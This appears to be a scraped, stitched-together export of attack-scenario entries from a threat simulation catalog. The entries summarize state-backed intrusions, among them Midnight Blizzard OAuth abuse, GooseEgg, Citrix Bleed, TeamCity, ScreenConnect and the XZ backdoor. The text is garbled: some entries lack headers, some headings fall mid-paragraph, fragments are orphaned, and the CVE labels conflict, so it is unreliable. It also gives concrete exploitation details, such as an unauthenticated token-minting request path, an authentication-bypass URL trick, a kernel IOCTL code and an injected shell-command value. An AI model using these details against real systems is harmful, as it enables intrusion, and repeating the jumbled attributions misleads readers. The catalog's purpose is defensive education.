- **Canonical URL:** https://attackexplorer.org/scenarios/ms-midnight-blizzard-oauth
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=ms-midnight-blizzard-oauth
- **Category:** ACTIVE_DIRECTORY | **Severity:** CRITICAL
- **Overview:** Imagine a burglar who finds a forgotten, dusty side cottage on a corporate estate (a legacy non-production test tenant) whose door still uses a simple single-key lock (no MFA). Inside that cottage, the burglar finds an old master maintenance badge (a legacy OAuth application) that happens to have cross-building authority in the main corporate headquarters. Using that badge, they mint new automated robot passes (Service Principals) granted the full_access_as_app stamp, letting them silently read any executive’s mailbox without ever needing any executive’s password. Documented by Microsoft Security Response Center (MSRC) and Microsoft Threat Intelligence (January 2024), this scenario illustrates how Midnight Blizzard (APT29) compromised corporate Exchange Online mailboxes through an identity-and-OAuth chain. First, the attacker used a low-and-slow residential-proxy password spray (sending only a few login attempts per IP so rate-based lockouts never trigger) to compromise a forgotten, non-production test tenant account that lacked MFA. From there, they abused an old OAuth application that had elevated permissions in the corporate environment, registered new malicious OAuth Service Principals, granted them the powerful full_access_as_app Exchange Online role (which allows reading any mailbox in the company via API without user interaction), and exfiltrated emails over EWS.
- **Stages (3):** Stage 1: LOW-VOLUME PASSWORD SPRAY ON LEGACY TEST TENANT (T1110.003) -> Stage 2: MALICIOUS OAUTH APP REGISTRATION & ROLE CONSENT (T1098.003) -> Stage 3: OAUTH BEARER TOKEN EWS MAILBOX EXFILTRATION (T1528)
- **Primary Sources:** [Microsoft Threat Intelligence: Midnight Blizzard: Guidance for responders on nation-state attack](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/); [CISA Emergency Directive: Emergency Directive 24-02: Mitigating the Significant Risk from Nation-State Compromise of Microsoft Corporate Email](https://www.cisa.gov/news-events/directives/ed-24-02-mitigating-significant-risk-nation-state-compromise-microsoft-corporate-email); [Mandiant / Google Cloud Threat Intelligence: APT29 (Midnight Blizzard / Cozy Bear) Cloud Identity & Service Principal Persistence Tradecraft](https://cloud.google.com/blog/topics/threat-intelligence/)

### T1014: Microsoft & Kaspersky — Salt Typhoon (GhostEmperor): Demodex Rootkit & Telecom Core Capture

- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine a telephone company’s central switching building. Instead of bugging a single office phone, the attacker slips into the core highway router (Cisco IOS XE), enables a hidden Linux maintenance room built right inside the router (Guest Shell), and taps the core fiber backbone (RADIUS / TACACS+ and packet capture pipes) so they can harvest network engineer credentials and silently copy traffic passing through the ISP. Documented by CISA, FBI, NSA, and Microsoft Threat Intelligence (2024), the Salt Typhoon APT campaign targeted major telecommunications and ISP core networks. Rather than attacking regular office workstations, Salt Typhoon compromised internet-facing edge and core routing appliances (such as Cisco IOS XE routers), abused the router’s built-in Linux container environment ("Guest Shell", a legitimate Linux environment inside the router where processes are invisible to standard router CLI commands) to run persistent implants and SSH tunnels, captured network administrator TACACS+ / RADIUS credentials in transit, and accessed sensitive core routing planes.

### CVE-2022-38028: Microsoft Threat Intel — Forest Blizzard (APT28): Print Spooler CVE-2022-38028 & GooseEgg
- **ID:** `ms-forest-blizzard-gooseegg`
- **Canonical URL:** https://attackexplorer.org/scenarios/ms-forest-blizzard-gooseegg
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=ms-forest-blizzard-gooseegg
- **Category:** MALWARE | **Severity:** HIGH
- **Overview:** Imagine a building where the mailroom’s high-privilege Printer Robot (spoolsv.exe, running as SYSTEM) uses a shared ledger (PnPData) to look up which driver helper (mpdwconstr.dll) it should load. Because a flaw lets a regular visitor edit the folder path in that ledger, the attacker changes the ledger to point to their own locker (wayzgoose.dll). When the Printer Robot wakes up, it loads the attacker’s library with full SYSTEM master-key authority. Documented by Microsoft Threat Intelligence (April 2024), the Forest Blizzard APT group (APT28 / STRONTIUM) used a custom post-exploitation tool named GooseEgg to escalate from a regular low-privilege user account to NT AUTHORITY\SYSTEM via CVE-2022-38028 in the Windows Print Spooler service (spoolsv.exe, chosen because it runs as SYSTEM on every Windows machine by default). GooseEgg modifies a JavaScript constraints file (mpdw-constraints.js) used by the Microsoft XPS Document Writer printer driver, triggers the Print Spooler to corrupt permissions so a custom driver DLL (wayzgoose.dll) can be planted, and forces spoolsv.exe to load that DLL with full SYSTEM privileges.
- **Stages (3):** Stage 1: GOOSEEGG SYMLINK & PNMS009.INF DRIVERSTORE TAMPERING (T1068) -> Stage 2: SPOOLSV.EXE LOADS WAYZGOOSE23.DLL AS SYSTEM (T1547.012) -> Stage 3: WHO.EXE SYSTEM BACKDOOR & COM SERVER HIJACK (T1546.015)
- **Primary Sources:** [Microsoft Threat Intelligence: Analyzing Forest Blizzard’s custom post-compromise tool for exploiting CVE-2022-38028 to obtain credentials](https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/); [Microsoft Security Response Center (MSRC): CVE-2022-38028 Windows Print Spooler Elevation of Privilege Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-38028); [The MITRE Corporation & ESET Research: MITRE ATT&CK Group G0007: APT28 (Forest Blizzard / Fancy Bear / Fighting Ursa)](https://attack.mitre.org/groups/G0007/)

### T1539: Microsoft, Unit 42 & CISA — Star Blizzard / Storm-0539: Evilginx AiTM Cookie Theft
- **ID:** `unit42-star-blizzard-evilginx-aitm`
- **Canonical URL:** https://attackexplorer.org/scenarios/unit42-star-blizzard-evilginx-aitm
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=unit42-star-blizzard-evilginx-aitm
- **Category:** NETWORK_WEB | **Severity:** HIGH
- **Overview:** Imagine a fake ATM booth placed right in front of a real bank window with a two-way mirror between them. When you walk up and type your PIN and tap your 6-digit phone MFA code, the fake booth immediately types those exact digits into the real bank window behind the glass. The real bank says: "Welcome! Here is your golden VIP Day Pass (ESTSAUTHPERSISTENT cookie)." The fake booth photocopies your golden Day Pass as it hands it to you, and now the thief can walk into the bank all day using their copy of your pass without ever needing your phone again. Documented by Microsoft Threat Intelligence, CISA, and Palo Alto Networks Unit 42, this scenario explains how Adversary-in-the-Middle (AiTM) phishing frameworks like Evilginx defeat traditional Multi-Factor Authentication (MFA) such as SMS codes, authenticator apps (TOTP), and push notifications. Instead of hosting a static fake login page that only steals a password, the attacker’s Evilginx server acts as a live reverse proxy sitting between the victim’s browser and the real login.microsoftonline.com server. When the victim types their password and approves their MFA prompt, Evilginx forwards that traffic to Microsoft in real time, and intercepts the resulting ESTSAUTHPERSISTENT session cookie (the post-MFA proof-of-login token) as Microsoft sends it back.
- **Stages (3):** Stage 1: EVILGINX AITM REVERSE-PROXY MFA INTERCEPTION (T1539) -> Stage 2: WEB SESSION COOKIE REPLAY (PASS-THE-COOKIE) (T1550.004) -> Stage 3: STEALTH INBOX RULE CREATION & BEC EXFILTRATION (T1564.008)
- **Primary Sources:** [CISA, NCSC-UK, NSA & FBI Joint Advisory: Star Blizzard (SEABORGIUM / COLDRIVER) Adversary-in-the-Middle Spear-Phishing & Session Cookie Theft (AA23-341A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-341a); [Microsoft Threat Intelligence: From Cookie Theft to BEC: Attackers Use AiTM Phishing Sites as Entry Point](https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/); [The MITRE Corporation & Palo Alto Unit 42: MITRE ATT&CK T1539: Steal Web Session Cookie & FIDO2 Token Binding Mitigations](https://attack.mitre.org/techniques/T1539/)

### CVE-2024-20353: Cisco Talos — ArcaneDoor (UAT4356): Cisco ASA Zero-Days, Line Dancer & Line Runner
- **ID:** `talos-arcanedoor-asa`
- **Canonical URL:** https://attackexplorer.org/scenarios/talos-arcanedoor-asa
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=talos-arcanedoor-asa
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine a border checkpoint guardhouse (a Cisco ASA VPN firewall) that has no security cameras inside its own booth. The attacker slips a hidden radio receiver (Line Dancer) into the guardhouse’s memory that listens for secret commands disguised inside regular traveler visa forms (/CSCOSSLC/config-auth), and welds a hidden spare key (Line Runner) into the checkpoint’s boot firmware (disk0:) so even if the building loses power and restarts, the backdoor comes right back to life. Documented by Cisco Talos, the UK NCSC, and CISA (April 2024), the ArcaneDoor espionage campaign targeted perimeter network devices, specifically Cisco Adaptive Security Appliances (ASA), using two custom implants: Line Dancer (an in-memory shellcode interpreter that hooks the firewall’s core lina process so the attacker can send commands disguised inside normal VPN login requests on port 443) and Line Runner (a persistent boot backdoor that abuses a legacy startup archive on disk0: so the implant automatically reloads even if the firewall is rebooted).
- **Stages (3):** Stage 1: ASA ZERO-DAY EXPLOIT & LINE RUNNER FLASH PERSISTENCE (T1542) -> Stage 2: LINE DANCER IN-MEMORY SHELLCODE INTERPRETER (T1059) -> Stage 3: SYSLOG SUPPRESSION, PCAP CAPTURE & CONFIG EXFIL (T1562.001)

### CVE-2024-21762: NCSC-NL, Talos & Mandiant — China-Nexus APT: FortiOS SSL-VPN & COATHANGER Persistent RAT
- **ID:** `talos-fortinet-coathanger-apt`
- **Canonical URL:** https://attackexplorer.org/scenarios/talos-fortinet-coathanger-apt
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=talos-fortinet-coathanger-apt
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine a fortress gate (a FortiGate firewall) where a burglar uses an oversized battering ram (Heap Overflow in sslvpnd) to slip inside. Once inside, the burglar hooks a tiny invisible coat hanger (ld.so.preload rootkit) onto the fortress’s coat rack so that every time an administrator runs the inspection command (ps or ls) to check if anyone is hiding in the room, the coat hanger intercepts the administrator’s glasses and erases the burglar from their field of view, and even hides a spare copy inside the emergency recovery partition (flatkc) to survive firmware updates. Documented by the Dutch Military Intelligence and Security Service (MIVD), NCTV, and Fortinet (February 2024), COATHANGER is a stealthy Remote Access Trojan (RAT) designed specifically for Fortinet FortiGate firewalls. After gaining initial entry via a heap buffer overflow in the FortiOS SSL-VPN daemon (sslvpnd, CVE-2022-42475 / CVE-2023-27997), COATHANGER hooks Linux userland libraries via /etc/ld.so.preload (forcing every program on the firewall to load the attacker’s filter library first, so the implant can hide its own files and processes from administrators) and hooks the flatkc boot unpacker so it survives firmware upgrades.
- **Stages (3):** Stage 1: FORTIOS SSLVPND HEAP OVERFLOW (CVE-2024-21762) (T1190) -> Stage 2: COATHANGER PRELOAD.SO ROOTKIT & SMARTCTL HOOK (T1574.006) -> Stage 3: MASQUERADED HTTPSD BEACON & VPN CREDENTIAL THEFT (T1014)
- **Primary Sources:** [NCSC-NL (Netherlands MIVD/AIVD): COATHANGER: Chinese Cyber Espionage Malware Targeting FortiGate Appliances](https://english.ncsc.nl/publications/publications/2024/february/6/mivd-and-aivd-alert-on-coathanger-malware); [CISA & Fortinet PSIRT: FG-IR-24-015 (CVE-2024-21762) & FG-IR-22-398 (CVE-2022-42475) FortiOS SSL-VPN RCE Advisories](https://www.fortiguard.com/psirt/FG-IR-24-015); [The MITRE Corporation & Appliance Forensics Research: MITRE ATT&CK T1574.006: Dynamic Linker Hijacking (LD_PRELOAD & /etc/ld.so.preload Rootkits)](https://attack.mitre.org/techniques/T1574/006/)

### CVE-2023-46747: F5 Security & Mandiant — F5 BIG-IP TMUI AJP Request Smuggling to Root RCE
- **ID:** `f5-bigip-request-smuggling`
- **Canonical URL:** https://attackexplorer.org/scenarios/f5-bigip-request-smuggling
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=f5-bigip-request-smuggling
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine a building with a strict front-door security guard (Apache httpd) and a trusting back-office clerk (Apache Tomcat) who talk to each other over an internal pneumatic tube (AJP protocol). A visitor sends a single long envelope whose outer label says it is just a public login-page check, so the front-door guard lets it through. Inside the pneumatic tube, however, the oversized message spills over and creates a brand-new second internal work order marked REMOTE_USER = admin. The back-office clerk reads that second forged work order and believes the front guard already verified the visitor as the building’s master administrator. Documented by ProjectDiscovery, Praetorian, and CISA (October–November 2023), CVE-2023-46747 is a critical unauthenticated Remote Code Execution vulnerability in the F5 BIG-IP Traffic Management User Interface (TMUI). The BIG-IP management web interface uses a two-tier architecture: a front-end Apache httpd server checks authentication and forwards requests over the binary Apache JServ Protocol (AJP) to a back-end Apache Tomcat server. By sending an HTTP request with a carefully sized header to a public .jsp page, the attacker triggers AJP Request Smuggling, injecting a forged second AJP packet straight into Tomcat with SC_A_REMOTE_USER=admin (tricking Tomcat into believing the front-end Apache server already authenticated the attacker as the master administrator).
- **Stages (3):** Stage 1: TMUI AJP REQUEST SMUGGLING (CVE-2023-46747) (T1190) -> Stage 2: ROGUE ADMIN ACCOUNT CREATION VIA TMSHCMD.JSP (T1136.001) -> Stage 3: ROOT BASH EXECUTION & SSL PRIVATE KEY EXFILTRATION (T1059.004)
- **Primary Sources:** [F5 SIRT Security Advisory: F5 BIG-IP Configuration Utility Unauthenticated RCE (CVE-2023-46747)](https://my.f5.com/manage/s/article/K000137353); [ProjectDiscovery & Praetorian Security Research: F5 BIG-IP Unauthenticated RCE via AJP Request Smuggling (CVE-2023-46747 Technical Deep-Dive)](https://blog.projectdiscovery.io/f5-big-ip-unauthenticated-rce-cve-2023-46747/); [NIST National Vulnerability Database (NVD) & CISA KEV: CVE-2023-46747 F5 BIG-IP Traffic Management User Interface (TMUI) Auth Bypass](https://nvd.nist.gov/vuln/detail/CVE-2023-46747)

- **ID:** `splunk-ivanti-connect-secure`
- **Canonical URL:** https://attackexplorer.org/scenarios/splunk-ivanti-connect-secure
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=splunk-ivanti-connect-secure
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine a secure government building where visitors must show an ID badge at the outer checkpoint before reaching any internal office. However, a hallway shortcut (../ path traversal) lets anyone walk around the outer checkpoint straight to the Python maintenance office (/api/v1/license/keys-status/). Once at the maintenance office window, the visitor hands over a form containing ; shell_command #, and the clerk types it straight into the building’s root terminal and installs a hidden translator (WIREFIRE) inside the public login page. ### CVE-2023-4966: Splunk STRT, Mandiant & CISA — Citrix Bleed: NetScaler OOB Memory Leak & NSC_AAAC Hijack
- **ID:** `splunk-citrix-bleed-session-hijack`
- **Canonical URL:** https://attackexplorer.org/scenarios/splunk-citrix-bleed-session-hijack
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=splunk-citrix-bleed-session-hijack
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine asking a hotel clerk to write your name on six lines of a 1-page welcome form, and then photocopy that page for you. Instead of giving a normal 10-letter name, you hand the clerk a 24,000-letter name (Host: header). The clerk’s 1-page form runs out of space after line 5, so the clerk stops writing, but when they walk over to the photocopier, they tell the machine: "Copy 147,000 letters worth of paper from my desk!" The photocopier copies the 1-page welcome form PLUS the confidential ledger sitting right next to it on the desk, which contains the active VIP room key (NSC_AAAC session cookie) of an administrator who already passed MFA. Synthesizing Assetnote’s vulnerability root-cause research, CISA/Mandiant Advisory AA23-325A, and Splunk SURGe detection telemetry, "Citrix Bleed" (CVE-2023-4966) is a memory over-read flaw in Citrix NetScaler ADC and Gateway appliances. When an attacker sends an HTTP GET request to the OpenID Connect configuration page with an abnormally long Host header (~24,576 characters), the appliance constructs a JSON response using snprintf() without checking that the buffer overflowed, causing it to dump ~16 KB of raw adjacent server RAM back in the HTTP response. Inside that leaked memory sits the plaintext NSC_AAAC session cookie (the active post-MFA session token of a logged-in user or administrator).
- **Stages (3):** Stage 1: NETSCALER SNPRINTF OOB MEMORY LEAK (CVE-2023-4966) (T1190) -> Stage 2: NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS (T1539) -> Stage 3: CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE (T1550.004)
- **Primary Sources:** [Assetnote Security Research: Citrix Bleed: Leaking Session Tokens with CVE-2023-4966 (snprintf Heap Over-Read Root Cause)](https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966); [Splunk SURGe Security Research: Citrix Bleed (CVE-2023-4966) Vulnerability Analysis and Detection Guidance](https://www.splunk.com/en_us/blog/security/citrix-bleed-cve-2023-4966-vulnerability-analysis-and-detection.html); [CISA / FBI / MS-ISAC / ASD Joint Advisory: Threat Actors Exploit Citrix Bleed (CVE-2023-4966) and Deploy LockBit 3.0 (AA23-325A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a)

### CVE-2023-41990: Kaspersky GReAT — Operation Triangulation: Zero-Click Font Exploit, MMIO & TriangleDB
- **ID:** `kaspersky-operation-triangulation`
- **Canonical URL:** https://attackexplorer.org/scenarios/kaspersky-operation-triangulation
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=kaspersky-operation-triangulation
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine someone slips an invisible envelope under a locked door (Zero-Click iMessage), and the automatic mail-sorting machine (IMAgent) jams on a rigged font instruction (ADJUST, CVE-2023-41990) before the homeowner even knows a letter arrived. Once inside, the intruder discovers that the vault’s memory walls are protected by an unbreakable software lock (Apple PPL). Instead of fighting the software guard, the intruder walks over to a secret, undocumented maintenance panel wired directly into the silicon chip (MMIO DMA Registers, CVE-2023-38606) and orders the hardware’s own Direct Memory Access crane to lift the vault roof from the outside. Discovered and documented by Kaspersky GReAT (2023–2024), Operation Triangulation is one of the most sophisticated zero-click mobile exploit chains ever analyzed. The victim receives an invisible iMessage attachment that triggers a memory corruption bug in Apple’s TrueType font parser (the legacy ADJUST bytecode instruction, CVE-2023-41990, executing automatically inside the background IMAgent daemon without the user ever tapping or seeing a notification). Next, to bypass Apple’s hardware-enforced Page Protection Layer (PPL), the exploit writes directly to undocumented CPU Memory-Mapped I/O (MMIO) hardware registers (CVE-2023-38606, instructing the chip’s hardware DMA engine to overwrite protected kernel RAM from the outside) and plants the TriangleDB memory-only implant.
- **Stages (3):** Stage 1: ZERO-CLICK IMESSAGE TRUETYPE ADJUST EXPLOIT (CVE-2023-41990) (T1203) -> Stage 2: XNU INTEGER OVERFLOW & HARDWARE MMIO BYPASS (CVE-2023-38606) (T1068) -> Stage 3: IN-MEMORY TRIANGLEDB IMPLANT DEPLOYMENT (T1620)
- **Primary Sources:** [Kaspersky GReAT (Global Research & Analysis Team): Operation Triangulation: The Last (Hardware) Mystery (CVE-2023-38606 & MMIO DMA Bypass)](https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/); [Kaspersky GReAT: Dissecting TriangleDB, the Operation Triangulation iOS Implant](https://securelist.com/triangledb-iostriangulation-implant/110050/); [Apple Security Engineering, NIST NVD & CISA KEV: CVE-2023-41990 (FontParser ADJUST Instruction) & CVE-2023-38606 (Kernel MMIO) Advisories](https://nvd.nist.gov/vuln/detail/CVE-2023-38606)

The thief places a rigged walkie-talkie (version.dll) on the table right next to the officer; when the officer turns it on, the rigged walkie-talkie still forwards normal radio calls to headquarters so the officer doesn’t suspect a thing, while secretly running ToddyCat’s TCESB spy radio inside the officer’s own uniform. ### CVE-2024-21338: Kaspersky, Microsoft & Avast — Lazarus Group (Diamond Sleet): appid.sys Zero-Day & FUDModule Rootkit
- **ID:** `kaspersky-lazarus-byovd-fudmodule`
- **Canonical URL:** https://attackexplorer.org/scenarios/kaspersky-lazarus-byovd-fudmodule
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=kaspersky-lazarus-byovd-fudmodule
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** In the past, attackers who wanted to cut the security cameras inside the Windows kernel had to smuggle an old, flawed third-party security guard (Bring Your Own Vulnerable Driver) into the building, which modern Windows blocklists immediately spot at gate. In this scenario, Lazarus Group found a zero-day flaw (CVE-2024-21338) in a guard who is already hired and pre-installed inside every Windows building (appid.sys, the built-in AppLocker driver). By whispering a forged instruction (IOCTL 0x22A018) to appid.sys, the attacker tricks the driver into flipping their own clearance badge from "Visitor (UserMode = 1)" to "Supreme Kernel Architect (KernelMode = 0)", and then quietly unplugs the EDR security agent’s cameras (Kernel Callbacks & ETW) without turning the EDR light off. Discovered by Avast and analyzed by Kaspersky and Microsoft (February 2024), this scenario shows how the Lazarus Group upgraded their FudModule rootkit. Previously, attackers had to drop a vulnerable third-party driver onto the system (Bring Your Own Vulnerable Driver, which Microsoft’s Vulnerable Driver Blocklist now blocks). Here, Lazarus exploited a zero-day flaw inside Windows’ own built-in AppLocker driver (appid.sys, CVE-2024-21338, pre-installed and signed by Microsoft on every Windows machine). By sending a crafted IOCTL control code (0x22A018) to appid.sys, the attacker flips their thread’s kernel privilege bit (PreviousMode = 0) and zeroes out the kernel callback tables and ETW sensors that EDR agents rely on.
- **Stages (3):** Stage 1: APPID.SYS KERNEL ZERO-DAY EXPLOIT (CVE-2024-21338) (T1068) -> Stage 2: FUDMODULE V3 DKOM: BLINDING SYSMON, ETW-TI & EDR (T1562.001) -> Stage 3: UNMONITORED KAOLIN RAT & LSASS CREDENTIAL DUMP (T1003.001)
- **Primary Sources:** [Avast Decoded Threat Labs: Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day (CVE-2024-21338)](https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/); [Microsoft Security Response Center (MSRC): CVE-2024-21338 Windows Kernel Elevation of Privilege Vulnerability (appid.sys)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21338); [Kaspersky GReAT & MITRE ATT&CK G0032: Lazarus Group (Diamond Sleet) KaolinRAT & FudModule Kernel Callback Blinding Analysis](https://attack.mitre.org/groups/G0032/)

The attacker walks up to the Super-Admin Key Minting machine (/app/rest/users/id:1/tokens/) and asks it to print a new master key named RPC2 (/app/rest/users/id:1/tokens/RPC2). Synthesizing SonarSource & Rapid7’s Java servlet root-cause analysis with the Joint CISA/FBI/NSA/NCSC & Mandiant APT29 Advisory (October 2023), this scenario shows how APT29 (Midnight Blizzard) exploited CVE-2023-42793 in on-premises JetBrains TeamCity CI/CD servers. Because an authentication wildcard flaw (/**/RPC2 inside TeamCity’s RequestInterceptors class) allowed anyone to reach internal REST paths that ended with "/RPC2" without logging in, the attacker sent a single unauthenticated POST request (/app/rest/users/id:1/tokens/RPC2) to mint a permanent administrator bearer token for User ID 1, enabled the hidden internal debug command endpoint (/app/rest/debug/processes), and deployed the GraphicalProton backdoor.

### CVE-2024-1709: Splunk STRT & Huntress — ConnectWise ScreenConnect "SlashAndGrab" Auth Bypass & RMM RCE
- **ID:** `splunk-screenconnect-slashandgrab`
- **Canonical URL:** https://attackexplorer.org/scenarios/splunk-screenconnect-slashandgrab
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=splunk-screenconnect-slashandgrab
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine a smart-lock system on an office building where the "First-Time Factory Setup Screen" (/SetupWizard.aspx) is supposed to be permanently locked after Day 1. However, the guard only checks if the visitor’s request ends with the exact letters /SetupWizard.aspx. By simply adding one extra forward slash at the end (/SetupWizard.aspx/), the guard says "That doesn’t end with .aspx, go right ahead!" while the web server behind the guard still opens /SetupWizard.aspx, letting any stranger on the internet re-run the Day-1 Factory Setup Wizard, overwrite the building’s master administrator database (User.xml), and broadcast commands to every computer managed by the IT team. Synthesizing Huntress ("SlashAndGrab"), ConnectWise Security Advisory (CVE-2024-1709 & CVE-2024-1708), and Splunk SURGe (February 2024), CVE-2024-1709 is one of the simplest yet most devastating authentication bypass bugs ever found in remote monitoring and management (RMM) software. On ConnectWise ScreenConnect servers, the initial installation wizard (/SetupWizard.aspx) is supposed to be blocked once the server is configured. However, appending a trailing slash or path suffix (/SetupWizard.aspx/anything, which fools the custom security check while ASP.NET still loads SetupWizard.aspx) reopens the first-time setup wizard, allowing anyone on the internet to overwrite the server’s primary administrator database (User.xml) and push SYSTEM commands to all connected customer endpoints.
- **Stages (3):** Stage 1: SETUPWIZARD.ASPX/ TRAVERSAL & USER.XML OVERWRITE (CVE-2024-1709) (T1190) -> Stage 2: MALICIOUS .ASHX EXTENSION UPLOAD & SYSTEM RCE (T1505.003) -> Stage 3: DOWNSTREAM FLEET COMMAND PUSH OVER TCP 8041 (T1219)

### CVE-2024-3094: Andres Freund, Red Hat & Kaspersky — XZ Utils (liblzma) IFUNC sshd Supply Chain Backdoor
- **ID:** `xz-utils-cve-2024-3094-backdoor`
- **Canonical URL:** https://attackexplorer.org/scenarios/xz-utils-cve-2024-3094-backdoor
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=xz-utils-cve-2024-3094-backdoor
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine a master locksmith ("Jia Tan") who spends two years volunteering at a company that makes a tiny brass spring (liblzma.so) used inside millions of Linux tools. Right before shipping version 5.6.1, the locksmith hides a microscopic radio receiver inside a box of "broken test springs" (bad-3-corrupt_lzma2.xz) and rigs the factory assembly script (build-to-host.m4) to weld that receiver into the finished spring. Because Linux’s main front-door guard (sshd) wears a status badge (libsystemd.so) that uses that exact brass spring, the radio receiver wakes up inside the front-door guard’s uniform, intercepts the signature-checking pen (RSA_public_decrypt), and opens the master vault whenever anyone shows a secret Ed448 signet ring! Synthesizing Andres Freund’s initial discovery on oss-security, Kaspersky GReAT’s binary reverse engineering, and Red Hat / CISA advisories (March 2024), CVE-2024-3094 (CVSS 10.0) is one of the most sophisticated supply chain backdoors in history. During compilation of XZ Utils 5.6.0/5.6.1, obfuscated m4 scripts extracted a prebuilt object (liblzma_la-crc64-fast.o) from corrupt test files (bad-3-corrupt_lzma2.xz). On Linux distributions that link OpenSSH (sshd) with libsystemd.so.0 (which in turn loads liblzma.so.5), a glibc Indirect Function (IFUNC) resolver hijacks OpenSSL’s RSA_public_decrypt function pointer, allowing an attacker holding a secret Ed448 private key to execute arbitrary root commands via system() before SSH authentication even finishes.
- **Stages (3):** Stage 1: M4 BUILD-TIME EXTRACTION & TRANSITIVE LIBSYSTEMD LOAD (T1195.002) -> Stage 2: GLIBC IFUNC RESOLVER & RSA_PUBLIC_DECRYPT GOT HIJACK (T1574.006) -> Stage 3: ED448 SSH CERTIFICATE VERIFICATION & PRE-AUTH SYSTEM() RCE (T1556)
- **Primary Sources:** [Andres Freund (Microsoft / OpenWall oss-security): backdoor in upstream xz/liblzma leading to ssh server compromise (CVE-2024-3094)](https://www.openwall.com/lists/oss-security/2024/03/29/4); [Kaspersky GReAT (Securelist): CVE-2024-3094: Technical Analysis of the XZ Utils Backdoor & Ed448 Payload Structure](https://securelist.com/xz-backdoor-story-part-1/112354/); [Red Hat Product Security & CISA: Urgent Security Alert for Fedora 40/Rawhide & CISA CVE-2024-3094 Supply Chain Advisory](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users)

### CVE-2023-34362: Mandiant, Huntress & CISA — CL0P (FIN11): MOVEit Transfer SQLi, ISAPI Deserialization & LEMURLOOT

Using that SQL flaw, the attacker slips a spring-loaded mechanical package (.NET BinaryFormatter Deserialization Gadget) into their visitor-pass row; the moment the server reads the pass back out of the ledger, the package springs open in memory and installs a hidden back-office clerk (human2.aspx / LEMURLOOT) who hands over the master keys to the company’s Azure cloud vaults. Synthesizing Mandiant (FIN11 / LEMURLOOT), Huntress Labs, Rapid7, and Joint CISA/FBI Advisory AA23-158A (May–June 2023), CVE-2023-34362 is the critical zero-day chain used by the CL0P ransomware group against Progress MOVEit Transfer servers worldwide.
